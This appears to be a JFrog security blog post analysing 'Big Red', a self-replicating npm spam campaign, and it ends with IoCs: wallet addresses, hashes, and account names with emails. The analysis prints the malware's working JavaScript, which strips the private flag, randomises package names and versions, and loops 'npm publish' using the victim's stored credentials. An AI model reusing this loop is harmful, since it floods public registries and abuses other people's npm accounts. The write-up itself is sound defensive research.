---
excerpt: Our team found a malicious cluster of about 80,000 self-replicating malware packages in the NPM registry. This report details the capabilities of the campaign and motivation behind it.
title: Big Red - Indonesian-based Self-replicating Malicious Spam Campaign detected in npm
date: "November 11, 2025"
description: "Andrii Polkovnychenko,  JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/big_red.png
type: realTimePost
minutes: '10'

---

The JFrog Security Team has recently detected a malicious cluster of about 80,000 self-replicating packages in the NPM registry. The campaign is still live on npm and continues to be tracked by our research team. While some of the malicious packages were initially [reported through OSV](https://osv.dev/vulnerability/MAL-2025-49571), a more thorough investigation revealed that the malicious campaign is much more widespread than initially reported. The malicious code is simple, however \- the campaign’s scale, automation pattern, and random name generation make it stand out from most npm supply chain attacks. What we see is an infrastructure that can mass-produce packages, using randomized names and versions to blend into normal registry noise.

The code is a simple but effective npm package factory. It wires together a few standard modules and a popular name generator into an automated loop that continuously rewrites package metadata and publishes new packages to the public registry under automatically generated names.

We have named this campaign “Big Red” (BR) due to a comment used by the malware author as part of its random name generation scheme. Based on the Indonesian-language phrases used in the code comments and in some of the generated package names, the activity is likely operated by an Indonesia-based actor.

## BR Payload Analysis 

Several packages reference the veylatea package (https://www.npmjs.com/package/veylatea) and include a configuration file tea.yaml:

```json
version: 1.0.0
codeOwners:
  - '0x61d82F709e595d579FAd3dFa688489B4556743D7'
quorum: 1
```

This strongly suggests that the packages were generated to boost visibility and page rank and to extract rewards from the tea.xyz ecosystem. While at their current iteration they do not pose significant direct risk to end-users, they reuse the victim’s credentials and abuse the npm registry.

BR achieves this by including a template `package.json` file and ensuring that this template is publishable by stripping out the `private` flag whenever it is set:

```javascript
let packageData = JSON.parse(packageJson);
if (packageData.private === true) {
     delete packageData.private;
}
```

Once the package is set up for publication, the script assigns a random-looking semantic version and a freshly generated name. Some of the payload variants rely on the existing [`unique-names-generator`](https://www.npmjs.com/package/unique-names-generator) legitimate npm package, seeded with dictionaries of adjectives, colors, and animals, producing names such as `ambitious_meadowlark_z3n` or `annoyed_raccoon_z3n`:

```javascript
const randomName = uniqueNamesGenerator({
  dictionaries: [adjectives, colors, animals],
}); // big_red_donkey (computed once, never used)

const newVersion = `${Math.floor(Math.random() * 4) + 1}.${
     Math.floor(Math.random() * 4) + 1
   }.${Math.floor(Math.random() * 4) + 1}`;
packageData.version = newVersion;

let randomFruit = uniqueNamesGenerator({
   dictionaries: [adjectives, animals, colors], // colors can be omitted here as not used
   length: 2,
 }); // big-donkey
 packageData.name = `${randomFruit}_z3n`;
```

Other payload variants replace this scheme with a custom wordlist based on Indonesian personal names and foods, resulting in identifiers like `indah-ketoprak73-riris` or `ocha-sambel51-breki`. 

After the metadata in `package.json` (and `package-lock.json`) is updated to match the new name and version, the script calls `npm publish --access public` to push the package to the registry, **reusing the victim user’s stored npm credentials**. 

```javascript
fs.writeFileSync("package.json", JSON.stringify(packageData, null, 2));
 
 let packageLockJson = fs.readFileSync("package-lock.json");
 let packageLockData = JSON.parse(packageLockJson);
 packageLockData.name = packageData.name;
 
 fs.writeFileSync(
   "package-lock.json",
   JSON.stringify(packageLockData, null, 2)
 );
```

The output is inspected for rate limiting (HTTP 429 “Too Many Requests”); if publishing is not blocked, the script increments its internal counter, waits for a short delay, and then restarts the process. The result is a tight, fully automated loop that can flood the npm ecosystem with large numbers of superficially legitimate packages, all derived from the same code template and differentiated only by randomized metadata.

```javascript
exec("npm publish --access public", (error, stdout, stderr) => {
if (stdout.includes("429 Too Many Requests")) {
     console.error("Error: Limit publish! Coba lagi nanti.");
     return;
   }
   const delay = generateRandomDelay();
   publishCount++;
   console.log(`Sukses mem-publish! Total publish: ${publishCount}`);
   setTimeout(publishPackage, delay);
 });

```

As a result, around 80,000 packages were published across 18 user accounts. As mentioned, because these packages contain nothing except this self-replicating publishing logic, their main purpose is probably to reuse victim npm credentials in order to extract rewards from the tea.xyz ecosystem, however more possible explanations include SEO or visibility farming, benchmarking, stress-testing how well automated publishing works in the npm ecosystem, or a dry run for a future campaign where the same infrastructure and naming scheme could be reused to deliver real malicious payloads for the campaigns with self-replicated code. 

## Staying safe against Big Red

To prevent the spreading of this campaign, npm users should check their published packages and make sure no new unintended packages were published in their name.

Frog Curation customers are protected, as all of the relevant packages were added as malicious in the JFrog Catalog. We are continuing to monitor the campaign and adding more packages as malicious as the campaign develops.

## IoCs

### tea.xyz addresses

| address                                    |
|:-------------------------------------------|
| 0x088435208353f36f8ef5BD557833BE31951300E2 |
| 0x61d82F709e595d579FAd3dFa688489B4556743D7 |
| 0xe4Db54b6A51d8098Fa0782FB7817E70b3F2dA135 |

### Self-replicating file hashes

| hash                                                             |
|:-----------------------------------------------------------------|
| 0144e86b037cd680557b75f873d22e9fba8bbd11960cae8bdc1cf9bcd2d700ce |
| c41afe14c1066f0cf206ab892009e14a6790c64670feb6f06e1863bee9bf2589 |
| 33428cb95be0c4c60265e149452345fa463c4de9bc335ef8de3d0ed12a709fc2 |
| 34f04d57b62a76fa3d963dd9d8b5d8180d50796460c03f0891f999978d41b82b |
| 962bad75e5689a5c496d3846714ed055d44432a946ccec55f6d4653d371d6c1c |
| ba6b01cb1882e5fe120de4c93cec3b6d8a67721d680316d56b8472137b74c94c |
| fd6537b8b0e327897a2a50531f2ccdbf5d91d42927a96f94b980580f9b6b565e |
| 7060f47c926575bfee85ea70cbb6f21d9a4fc7fa75c7e91f5cad6faf21cc4044 |
| 721f03a937e6a81cd6c21e48262094bf7ffdd1e7cac3d03efee95dd5b8ec8028 |
| d0dbc016176970c26668740953f0227fdae0a8839ef798a3eeec97eb44505145 |
| f48b0ce2814e1649a4c7684fa860f2770c78a29ce7af886d0aa340862738c31c |
| 59507777c182d3bbafcb692a756ae7ffd33192085bda1a6e5dec821db72b3d70 |
| b4f39051e2c0962af17f30df452ec8a9135ca4ce8204759a56884c56031e09da |
| ea7e34781bf18e5fa8347e8f32259e26a16ddf1d4a2f0d1bf4b3b434d44416c4 |
| 43a824b55355ef2dac99574aef2e6475e809ec45b4207a2dec5e3a27d57c0c8b |
| 3f42ec16a3f83b31b78c8f8040f5d0e91cbb779cf8cfd1781b74752933cf685e |
| 4913091f751122d71ac5b3135e10a6f150b219b0013bd874217ade83916ca8fc |
| 6a997057b87d37fc764e6c1e568a961e27216843d286b79f35c145f7c6dfbb8c |
| 93c0dbcae87248c1237fe3e57efe04731b6c0d9b3ccbd0cd72d613886d5000cf |
| 5f757274891f096bca17cb31e3c8b252cb1a3b9b1ebf2a11e30369523ed910c3 |
| 8bdfb19810b140aa9bfefa1916e2c7476fac4b057cfe5a4505805d2a1dba12c5 |

### NPM users

| User  | email |
| :---- | :---- |
| waifurs | hayatemen102@gmail.com |
| vndra | buatvendra@gmail.com |
| vayza | mogalending@gmail.com |
| yunina | ysusbingung@gmail.com |
| veyla | violanavsya@gmail.com |
| noirdnv | novvvee@gmail.com |
| doaortu | adesumani63@gmail.com |
| voinza | vendraaku@gmail.com |